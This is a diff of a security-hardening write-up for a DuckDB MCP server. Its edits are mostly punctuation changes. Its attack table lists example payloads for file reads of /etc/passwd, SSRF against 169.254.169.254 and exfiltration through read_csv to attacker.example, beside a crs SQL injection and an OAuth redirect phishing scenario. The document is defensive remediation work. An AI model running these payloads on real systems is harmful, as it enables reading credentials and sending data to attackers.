@@ -6,7 +6,7 @@ fixed, what was deliberately not fixed (and why), and how to verify the state
 after any unit edit.
 
 **Update 2026-04-19:** a post-OAuth audit surfaced one HIGH-severity
-finding — a SQL injection via `create_layer`'s `crs` parameter that
+finding: a SQL injection via `create_layer`'s `crs` parameter that
 bypassed the `_validate_sql` sandbox. Fixed in `36bf3cb` with a strict
 `EPSG:<digits>` regex whitelist. The same audit pass drove a follow-on
 hardening: secrets moved from `EnvironmentFile=` to `LoadCredential=`
@@ -22,7 +22,7 @@ first and rotate the bearer token.
 ## Background
 
 The MCP server exposes a 12-tool surface to LLM callers, one of which is
-`execute_sql` — a DuckDB spatial SQL escape hatch. An early version of the
+`execute_sql`, a DuckDB spatial SQL escape hatch. An early version of the
 validator allowed only `SELECT` / `WITH` / `UNION` statement types via sqlglot,
 which is necessary but not sufficient: DuckDB treats `read_csv`, `read_parquet`,
 `glob`, `read_text` etc. as ordinary functions callable inside any `SELECT`.
@@ -42,17 +42,17 @@ callable with a valid bearer token via `execute_sql`.
 |---|---|---|
 | Arbitrary local file read | `SELECT * FROM read_csv('/etc/hostname')` | Any file readable by the service's user (`ben`). |
 | Directory enumeration | `SELECT * FROM glob('/etc/*')` | Listing of any readable directory. |
-| HTTP(S) outbound (SSRF) | `SELECT * FROM read_parquet('http://169.254.169.254/…')` | Real outbound HTTP — enables SSRF against internal admin endpoints and exfiltration via `read_csv('https://attacker.example/x.csv?q=…')`. |
+| HTTP(S) outbound (SSRF) | `SELECT * FROM read_parquet('http://169.254.169.254/…')` | Real outbound HTTP. Enables SSRF against internal admin endpoints and exfiltration via `read_csv('https://attacker.example/x.csv?q=…')`. |
 | `file://` URL reads | `SELECT * FROM read_csv('file:///etc/passwd')` | Equivalent to local-path reads; bypasses filters that only blocked `/`-prefixed paths. |
 | DoS primitives | `SELECT repeat('a', 1e10)`, `generate_series(0, 1e11)` | Memory exhaustion on a 4 GB host. The per-session `memory_limit=256MB` kicks in eventually but not before wasting CPU/allocation. |
 
 Specific secrets enumerated from `/home/ben`:
 
-- `~/.claude.json` + `.backup` — Claude Code OAuth tokens
-- `~/.config/gh/hosts.yml` — GitHub CLI OAuth token
-- `~/.bash_history` — shell history
-- `~/.ssh/authorized_keys`, `known_hosts` — public only, not a secret leak
-- systemd user unit files at `~/.config/systemd/user/*.service` — recon on layout
+- `~/.claude.json` + `.backup`: Claude Code OAuth tokens
+- `~/.config/gh/hosts.yml`: GitHub CLI OAuth token
+- `~/.bash_history`: shell history
+- `~/.ssh/authorized_keys`, `known_hosts`: public only, not a secret leak
+- systemd user unit files at `~/.config/systemd/user/*.service`: recon on layout
 
 Not reachable (the earlier state wasn't *that* bad):
 
@@ -65,13 +65,13 @@ Not reachable (the earlier state wasn't *that* bad):
 
 ---
 
-## The fix — three independent layers
+## The fix: three independent layers
 
 Each layer is sufficient on its own for the specific attack class it handles;
 all three together are defense-in-depth. Losing any one should not expose the
 full attack surface.
 
-### Layer 1 — sqlglot validator (`operations.py::_validate_sql`)
+### Layer 1: sqlglot validator (`operations.py::_validate_sql`)
 
 Lives in `geodata_mcp/operations.py`. Runs on every `execute_sql` call
 regardless of session.
@@ -109,7 +109,7 @@ with:
 **Numeric-literal cap.** Any numeric literal > 10,000,000 is rejected. Stops
 `repeat('a', 1e10)` and `generate_series(0, 1e11)` *before* DuckDB allocates.
 
-### Layer 2 — DuckDB per-session resource caps (`session.py`)
+### Layer 2: DuckDB per-session resource caps (`session.py`)
 
 At every `Session.__init__`:
 
@@ -124,63 +124,63 @@ self.conn.execute("SET threads = 2")
 Together these cap memory, CPU concurrency, and max query duration per
 session. One greedy call cannot OOM the box even if it passes validation.
 
-### Layer 3 — systemd sandbox (identity, filesystem, egress, syscalls)
+### Layer 3: systemd sandbox (identity, filesystem, egress, syscalls)
 
 Lives in `/etc/systemd/system/geodata-mcp.service`. The service runs as a
 dedicated unprivileged user with a restricted kernel mount namespace,
-cgroup-BPF egress filter, and seccomp syscall denylist — not just file
+cgroup-BPF egress filter, and seccomp syscall denylist, not just file
 permissions.
 
 **Identity.**
 
-- `User=geodata-mcp`, `Group=geodata-mcp` — dedicated system user (no login
+- `User=geodata-mcp`, `Group=geodata-mcp`: dedicated system user (no login
   shell, no home directory). Created via `useradd -r -s /usr/sbin/nologin -M
   -d /nonexistent`. `ben` is a member of the `geodata-mcp` group so both
   identities can read/write the shared writable dirs.
 - Source code under `/home/ben/geodata-mcp` is owned `ben:ben` and
-  group-readable only — the service user **cannot modify its own code**, so
+  group-readable only. The service user **cannot modify its own code**, so
   RCE inside the process can't persist by patching Python files.
-- `SupplementaryGroups=` (explicit empty) — no inherited groups from
+- `SupplementaryGroups=` (explicit empty): no inherited groups from
   `/etc/group`.
 
 **Filesystem.**
 
-- `ProtectHome=tmpfs` + `BindPaths=/home/ben/geodata-mcp` — `/home` is an
+- `ProtectHome=tmpfs` + `BindPaths=/home/ben/geodata-mcp`: `/home` is an
   empty tmpfs; only the project dir is bind-mounted. `~/.claude.json`,
   `~/.config/gh/hosts.yml`, `~/.bash_history`, `~/.ssh/*` do not exist in
   this process's view of the filesystem.
-- `ProtectSystem=strict` — `/` is read-only except explicit `ReadWritePaths`
+- `ProtectSystem=strict`: `/` is read-only except explicit `ReadWritePaths`
   (`data/exports`, `.duckdb`).
 - `InaccessiblePaths=/etc/ssh /etc/ssl/private /etc/shadow /etc/gshadow
   /etc/sudoers /etc/sudoers.d /etc/credstore /etc/caddy /etc/systemd
-  /root /var/log` — admin config, service logs, and the on-disk secret
+  /root /var/log`: admin config, service logs, and the on-disk secret
   source (`/etc/credstore/`) are blocked. Secrets reach the service via
   systemd `LoadCredential=` on a separate tmpfs mount point inside the
   sandbox, readable only by the service user via file ACL.
 - `PrivateTmp=true`, `PrivateDevices=true`, `ProtectKernelTunables`,
   `ProtectKernelModules`, `ProtectKernelLogs`, `ProtectControlGroups`,
   `ProtectClock`, `ProtectHostname`.
-- `UMask=0002` — new files in the shared group dirs are group-writable so
+- `UMask=0002`: new files in the shared group dirs are group-writable so
   `ben` dev and the service can both read each other's outputs.
 
 **Egress (cgroup BPF).**
 
-- `IPAddressDeny=any` + `IPAddressAllow=localhost` — kernel-enforced
+- `IPAddressDeny=any` + `IPAddressAllow=localhost`: kernel-enforced
   per-cgroup egress filter. The process can only send packets to
   `127.0.0.0/8` / `::1`. Blocks SSRF against `169.254.169.254`, arbitrary
   HTTPS exfiltration, DuckDB extension registry fetches. Caddy →
   `127.0.0.1:8765` still works because it's loopback.
-- `RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6` — other families
+- `RestrictAddressFamilies=AF_UNIX AF_INET AF_INET6`: other families
   (netlink, packet, bluetooth) denied at the socket layer.
 
 **Syscalls (seccomp).**
 
-- `SystemCallArchitectures=native` — blocks x86-32 compat ABI on amd64
+- `SystemCallArchitectures=native`: blocks x86-32 compat ABI on amd64
   (common exploit primitive).
 - `SystemCallFilter=~@mount @swap @reboot @debug @module @raw-io
   @cpu-emulation @obsolete bpf ptrace perf_event_open process_vm_readv
   process_vm_writev userfaultfd keyctl add_key request_key kexec_load
-  kexec_file_load` — denylist blocking kernel-exploit vectors (container
+  kexec_file_load`: denylist blocking kernel-exploit vectors (container
   escape primitives, memory snooping across processes, keyring access, live
   kernel replacement). Denylist approach instead of
   `SystemCallFilter=@system-service` because the allowlist version segfaulted
@@ -208,21 +208,21 @@ intentional for the shared-group writable dirs).
 These were tried, segfaulted DuckDB spatial's GDAL/PROJ loader, and omitted
 with notes so a future editor doesn't re-add them blind:
 
-- **`SystemCallFilter=@system-service`** (allowlist form) — seccomp denied a
+- **`SystemCallFilter=@system-service`** (allowlist form): seccomp denied a
   syscall the spatial extension makes during initialization. Reproducible
   SIGSEGV ~1 second after service start. Replaced with the **denylist**
   version above (`SystemCallFilter=~...`), which targets exploit primitives
   without breaking the spatial extension.
-- **`ProtectProc=invisible` + `ProcSubset=pid`** — some libraries read
+- **`ProtectProc=invisible` + `ProcSubset=pid`**: some libraries read
   `/proc/cpuinfo` for SIMD detection; with these on, the read fails and the
   library crashes.
-- **`MemoryDenyWriteExecute=true`** — Python's ctypes and GDAL's JIT paths
+- **`MemoryDenyWriteExecute=true`**: Python's ctypes and GDAL's JIT paths
   require W^X-violating mmap regions.
 
 Also deliberately not implemented:
 
 - **DuckDB `enable_external_access=false` at session start.** Blocks the
-  httpfs extension *and* `read_parquet`/`read_csv` — but the catalog loader
+  httpfs extension *and* `read_parquet`/`read_csv`, but the catalog loader
   uses those for local files. Toggling it around trusted internal calls is
   doable but fragile; layer 1 already blocks the abuse paths and layer 3
   blocks both the filesystem access *and* the outbound network, so the
@@ -231,7 +231,7 @@ Also deliberately not implemented:
   use the server (MCP November 2025 spec requires OAuth 2.1 + PKCE for
   public remote servers; claude.ai custom connectors support it). Currently
   bearer-only, which works for Claude Code / Desktop / scripted MCP clients.
-  Planned — see README roadmap.
+  Planned. See README roadmap.
 - **Audit log of every `execute_sql` call.** Would let post-hoc detection of
   probing attempts (sqlglot rejections, repeated requests). Planned; would
   write to a file outside `ReadWritePaths` via a forwarding unit to prevent
@@ -257,7 +257,7 @@ python3 -c "import json; print(json.load(open('$HOME/.claude/.credentials.json')
 ```
 
 Anthropic's console (console.anthropic.com) has explicit session / API key
-revocation — worth doing so the old token is server-side-invalid, not just
+revocation, worth doing so the old token is server-side-invalid, not just
 superseded locally.
 
 For the MCP secrets (as of 2026-04-19 they live in `/etc/credstore/` and
@@ -374,17 +374,17 @@ r = await c.call_tool("execute_sql",
 
 ## Residual risks (known)
 
-1. **Rate limiter is in-process** — a multi-worker deploy would need shared
+1. **Rate limiter is in-process.** A multi-worker deploy would need shared
    state (Redis, or Caddy's `rate_limit` plugin). Single-worker today.
-2. **`data/exports/<token>/` is world-readable via the URL** — by design for
+2. **`data/exports/<token>/` is world-readable via the URL**, by design for
    browser downloads. Anyone with the token can fetch for 24 h.
-3. **Bearer token instead of OAuth 2.1** — shared-secret model means a single
+3. **Bearer token instead of OAuth 2.1.** Shared-secret model means a single
    leak grants full access. Rotation works but reactive. OAuth 2.1 + PKCE
    (per the MCP Nov 2025 spec) is the structural fix; planned.
-4. **No audit log of `execute_sql` rejections** — probing attempts go
+4. **No audit log of `execute_sql` rejections.** Probing attempts go
    undetected except via Caddy access logs. Planned (see "Deliberately not
    implemented").
-5. **Claude Code's `/login` doesn't rotate tokens** — if that token ever
+5. **Claude Code's `/login` doesn't rotate tokens.** If that token ever
    leaks, `rm .credentials.json` + re-auth is the only way. Anthropic-side
    revocation is the belt-and-braces.
 6. **DuckDB extension cache is pinned to v1.5.2 on disk.** `INSTALL spatial`
@@ -397,13 +397,13 @@ r = await c.call_tool("execute_sql",
 
 ## Summary of what was rotated after remediation
 
-- Claude Code OAuth token — fully rotated via `rm ~/.claude/.credentials.json`
+- Claude Code OAuth token: fully rotated via `rm ~/.claude/.credentials.json`
   + re-auth + server-side revocation in console.anthropic.com.
-- GitHub CLI OAuth token — rotated via `gh auth logout && gh auth login`.
-- MCP bearer token — rotated via `/etc/credstore/geodata-mcp.token`
+- GitHub CLI OAuth token: rotated via `gh auth logout && gh auth login`.
+- MCP bearer token: rotated via `/etc/credstore/geodata-mcp.token`
   write + `systemctl restart geodata-mcp` (2026-04-19, after the env-leak
   finding). Previously rotated via `/etc/geodata-mcp.env` + Caddy
-  restart — both files have since been removed.
+  restart; both files have since been removed.
 - No private SSH keys were on the VPS (public `authorized_keys` only), so
   nothing to rotate there.
 - Tailscale state at `/var/lib/tailscale/` is root-only and was never in
@@ -425,10 +425,10 @@ multi-commit feature pass, I ran a full security review (three parallel
 agents per the `/security-review` skill). Three candidate findings
 surfaced; one survived the false-positive filter.
 
-### Finding 1 — SQL injection via `crs` (HIGH, 9/10, FIXED)
+### Finding 1: SQL injection via `crs` (HIGH, 9/10, FIXED)
 
 `create_layer`'s `crs` argument flowed unvalidated into an f-string
-executed directly by DuckDB — **not** through `_validate_sql`, so the
+executed directly by DuckDB (**not** through `_validate_sql`), so the
 existing file-reader / httpfs / abs-path / numeric-literal denylist did
 not apply. The only guard was `crs.startswith("EPSG:")`, trivially
 bypassed by appending a crafted tail:
@@ -447,25 +447,25 @@ before interpolation. The previous `"EPSG:" + crs` fallback for bare
 numeric inputs is removed; the error message directs callers to use the
 full `EPSG:<code>` form.
 
-### Finding 2 — Column-name quoting in merged-GeoJSON export (LOW, correctness, FIXED)
+### Finding 2: Column-name quoting in merged-GeoJSON export (LOW, correctness, FIXED)
 
 The sibling `escaped_layer = layer.replace("'", "''")` path correctly
 escaped single quotes in layer names; the `_prop_expr` column-name path
 did not. Concretely a real column `"King's Road"` would have broken the
 JSON-emission SQL. Also a mild injection surface (attacker-chosen dict
 keys via `create_layer`), but the "attacker is the MCP caller who
-already has `execute_sql`" argument applies — no trust boundary crossed.
+already has `execute_sql`" argument applies; no trust boundary crossed.
 
 **Fix (commit `72fe3bf`):** same `c.replace("'", "''")` pattern in
 `_prop_expr`.
 
-### Finding 3 — OAuth dynamic-registration phishing (LOW, defense-in-depth, FIXED)
+### Finding 3: OAuth dynamic-registration phishing (LOW, defense-in-depth, FIXED)
 
 `/oauth/register` is public (RFC 7591 dynamic client registration; needed
 for claude.ai custom connectors). An attacker could register a client
 with their own `redirect_uris=["https://attacker.example/cb"]`, phish an
-invite-code holder to the standard consent URL, and — if the victim typed
-the invite code — receive a valid OAuth access token on their own
+invite-code holder to the standard consent URL, and (if the victim typed
+the invite code) receive a valid OAuth access token on their own
 callback. The documented threat model treats invite holders as mutually
 trusting, so this is below the "deploy-blocker" bar; but making the
 callback host visible at consent time is cheap insurance.
@@ -474,9 +474,9 @@ callback host visible at consent time is cheap insurance.
 `<scheme>://<netloc>` of `redirect_uri` prominently above the invite
 field, alongside a yellow warning: *"If this isn't a host you recognize
 (e.g. `claude.ai` for claude.ai, `localhost` for local testing), do
-not continue — it could be a phishing attempt."*
+not continue; it could be a phishing attempt."*
 
-### Secondary finding — env-leak amplifier of a file-read exploit (MEDIUM, FIXED)
+### Secondary finding: env-leak amplifier of a file-read exploit (MEDIUM, FIXED)
 
 While triaging whether the finding-1 injection *would* have leaked
 credentials given the separate-user + filesystem sandbox, I discovered
@@ -501,22 +501,22 @@ bypass) would have exfiltrated both.
 - The env-var form is gone from the process: `cat /proc/$PID/environ |
   tr '\0' '\n' | grep -E 'TOKEN|INVITE'` returns nothing.
 - `ProtectProc=invisible` added (blocks visibility into other processes'
-  `/proc/<pid>` — defense-in-depth).
+  `/proc/<pid>`, defense-in-depth).
 - `/etc/credstore` added to `InaccessiblePaths`; the source files are
   only readable via systemd's credential delivery, not via any path the
   service can reach directly.
 - `EnvironmentFile=/etc/geodata-mcp.env` removed from the unit;
   `/etc/geodata-mcp.env` deleted on disk.
 - The orphaned `/etc/systemd/system/caddy.service.d/geodata-token.conf`
-  Caddy drop-in was also removed — Caddy stopped bearer-checking at the
+  Caddy drop-in was also removed; Caddy stopped bearer-checking at the
   edge when OAuth 2.1 landed in the app, so it hasn't needed the token
   since.
 
 ### Why `ProcSubset=pid` still isn't applied
 
 Reproducibly segfaults DuckDB spatial at `INSTALL spatial; LOAD spatial`
-— GDAL (bundled into the spatial extension) reads `/proc/cpuinfo` during
-SIMD feature detection, and `ProcSubset=pid` hides non-PID entries from
+(GDAL, bundled into the spatial extension, reads `/proc/cpuinfo` during
+SIMD feature detection), and `ProcSubset=pid` hides non-PID entries from
 `/proc`. Verified 2026-04-19 on Linux 6.8, systemd 255, DuckDB 1.5.2.
 `ProtectProc=invisible` alone works and is now applied.
 
@@ -527,7 +527,7 @@ SIMD feature detection, and `ProcSubset=pid` hides non-PID entries from
   the demo posture; swap for SQLite if the deployment becomes persistent.
 - **One shared invite code.** No per-user revocation. Rotation via
   `/etc/credstore/geodata-mcp.invite` + service restart.
-- **No audit log of `execute_sql` calls** — still pending; journalctl
+- **No audit log of `execute_sql` calls.** Still pending; journalctl
   access-log line is the only trail.
 
 ### Rotation after this pass
